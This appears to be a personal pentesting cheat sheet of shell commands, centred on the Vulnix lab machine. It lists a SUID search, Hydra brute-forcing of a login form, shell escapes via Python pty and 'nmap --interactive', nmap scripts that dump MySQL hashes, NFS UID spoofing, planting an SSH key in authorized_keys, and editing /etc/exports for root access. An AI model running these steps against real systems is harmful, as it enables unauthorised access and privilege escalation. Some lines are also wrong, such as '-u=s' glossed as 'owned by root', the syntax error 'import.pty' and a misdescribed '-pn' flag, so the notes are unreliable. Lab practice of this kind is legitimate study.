Find all files with SUID bit

    find / -perm -u=s -type f 2>/dev/null

or

    find / -perm -4000 -type f 2>/dev/null

Explanation:

    /denotes  start from the top (root) of the file system and find every directory
    -permdenotes search for the permissions that follow
    -u=sdenotes look for files that are owned by the root user
    -typestates the type of file we are looking for
    f denotes a regular file not the directories or special files
    2 denotes to the second file descriptor of the process, i.e. stderr (standard error)
    > means redirection
    /dev/null is a special filesystem object that throws away everything written into it.


Hydra Password Bruteforce

    hydra 192.168.1.69 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
    
Explanation:

    Host = 192.168.1.69
    Method = http-form-post
    URL = /w3af/bruteforce/form_login/dataReceptor.php
    Form parameters = user=^USER^&pass=^PASS^
    Failure response = Bad login
    Users file = users.txt
    Password file = pass.txt
    Threads = -t 10
    Wait for timeout = -w 30
    Output file = -o hydra-http-post-attack.txt

To remove all duplicates in a dictionary file

    cat filename.txt | sort | uniq > outfile.txt

Spawn bash

    python -c 'import.pty;pty.spawn("/bin/bash")'

nmap interactive

	nmap --interactive
	!bash -p
more nmap
	-sL : list targets to scan
	-pn : disable port scan(ping sweep?)
	
cool nmap scripts
	
	--script=http-enum
	--script=http-default-accounts
	--script=http-phpmyadmin-dir-traversal
	

passing parameters into nmap script example

	nmap -p 3306 <ip> --script mysql-dump-hashes --script-args='username=root,password=secret'
	nmap -p 3306 100.65.136.252 --script=mysql-query --script-args='query="show tables FROM corporate_database",username=root,password=abc123'
	
	**dont forget username and pass

List of nmap scripts	
https://nmap.org/nsedoc/



WPSCAN

	wpscan --url <url>
	
WPSCAN enumerate users

	-enumerate u
	-e ap **uodate this later**
	
---- NFS ports ----

If NFS ports are open

	showmount -e <ip>
	<returns shared directories> e.g /home/vulnix

Mounting the NFS directory

		cd ~
		mkdir vulnix
		mount -t nfs <ip>:/home/vulnix ~/vulnix
		
View permissions and stuff of the new directory

		ls -ld vulnix
		<this may not show the UID and GID, showing as 'nobody'>
		<e.g drwxr-x--- 2 nobody nobody 4096 Sep  2  2012 vulnix>
		and/or
		stat vulnix
		
Mount differently if cant see UID and GID

		mount -t nfs -o vers=3 <ip>:/home/vulnix ~/vulnix
		ls -ld vulnix
		<should show the real UID and GID this time>
		<e.g mount -t nfs -o vers=3 192.168.2.4:/home/vulnix ~/vulnix >
		
Create a spoof user

		groupadd --gid 2008 vulnix_group
		useradd --uid 2008 --groups vulnix_group vulnix_user
		sudo -u vulnix_user ls -a vulnix
		<if you have permissions now, it should show the file listing in the directory>
		
Can also use nfspy, this spoofs user instead of really creating it
https://github.com/bonsaiviking/NfSpy

		nfspy -o server=192.168.2.4:/home/vulnix,nfsport=2049/tcp,rw vulnix
		or for root:
		nfspy -o server=192.168.2.4:/,nfsport=2049/tcp,rw ~/vulnix_root


SSL KEY STUFF (figure this out later) original url: https://medium.com/@Kan1shka9/hacklab-vulnix-walkthrough-b2b71534c0eb

		root@kali:~# ls /root/.ssh/
		root@kali:~# ssh-keygen
		Generating public/private rsa key pair.
		Enter file in which to save the key (/root/.ssh/id_rsa):
		Enter passphrase (empty for no passphrase):
		Enter same passphrase again:
		Your identification has been saved in /root/.ssh/id_rsa.
		Your public key has been saved in /root/.ssh/id_rsa.pub.
		The key fingerprint is:
		SHA256:VoZMUJiHramBTJnCofq3Osa2s3JaFFJP0yct0V5KKwU root@kali
		The key's randomart image is:
		+---[RSA 2048]----+
		|..ooo.E%o        |
		|oo+o .BoO..      |
		|o+...  @o+o      |
		|..o.. + +o       |
		|. .  o .S        |
		| o  .  .         |
		| .o .            |
		|..B. .           |
		|.*+*.            |
		+----[SHA256]-----+
		root@kali:~# ls /root/.ssh/
		id_rsa  id_rsa.pub
		root@kali:~# cat /root/.ssh/id_rsa.pub
		ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC42NpxutFyfjQuOtZRiHzS/HRgCDQZZrrmizKrLmnhWy4RbzMqFc/URB22QtHkQLnX4libQkGKaSce2bEE2mF0DKB8oX/O9L+J7BYf5d7C6UQ1fLXN1Tg3Ls4QbKBrQGKPH14rdmzSe+ESKc5fE+cvBhB7f8Ub4HnZTDhLCSLJoyzNf85BkU/QjjWymxEXaoSDhg9vPgXEeQAAUCikkpcTwE5PVGG8z+m1fR0OZnzm45sfe2b+NI18owH60oGm8n8O6jOivsvlohXpNrcCm2Ago994zVA4V9ntPd6owXb77Wu1w8Zz1x1dK79QvIook18B6SIhnjJWyFgxHox2Gg8F root@kali


Copy key into target's authorized keys(figure this out later too)

		root@kali:~# su vulnix
		$ cd /tmp/nfs
		$ ls -la
		total 20
		drwxr-x---  2 vulnix vulnix 4096 May 16 16:25 .
		drwxrwxrwt 15 root   root   4096 May 16 18:36 ..
		-rw-r--r--  1 vulnix vulnix  220 Apr  3  2012 .bash_logout
		-rw-r--r--  1 vulnix vulnix 3486 Apr  3  2012 .bashrc
		-rw-r--r--  1 vulnix vulnix  675 Apr  3  2012 .profile
		$ mkdir .ssh
		$ cd .ssh
		$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC42NpxutFyfjQuOtZRiHzS/HRgCDQZZrrmizKrLmnhWy4RbzMqFc/URB22QtHkQLnX4libQkGKaSce2bEE2mF0DKB8oX/O9L+J7BYf5d7C6UQ1fLXN1Tg3Ls4QbKBrQGKPH14rdmzSe+ESKc5fE+cvBhB7f8Ub4HnZTDhLCSLJoyzNf85BkU/QjjWymxEXaoSDhg9vPgXEeQAAUCikkpcTwE5PVGG8z+m1fR0OZnzm45sfe2b+NI18owH60oGm8n8O6jOivsvlohXpNrcCm2Ago994zVA4V9ntPd6owXb77Wu1w8Zz1x1dK79QvIook18B6SIhnjJWyFgxHox2Gg8F root@kali > authorized_keys


Copy own key into target's authorized keys

		cp ~/.ssh/id_rsa.pub vulnix/.ssh/authorized_keys

SSH into target

		ssh vulnix@<ip>
		
** extras **

		cat /etc/exports
		/home/vulnix	*(rw,root_squash)

can add the following into /etc/exports to export the whole machine


		/		*(rw,no_root_squash)
		
find a way to restart computer or service
remount the thing
spoof root uid and gid
add new key again
ssh in as root


Link to walkthrough
https://blog.christophetd.fr/write-up-vulnix/
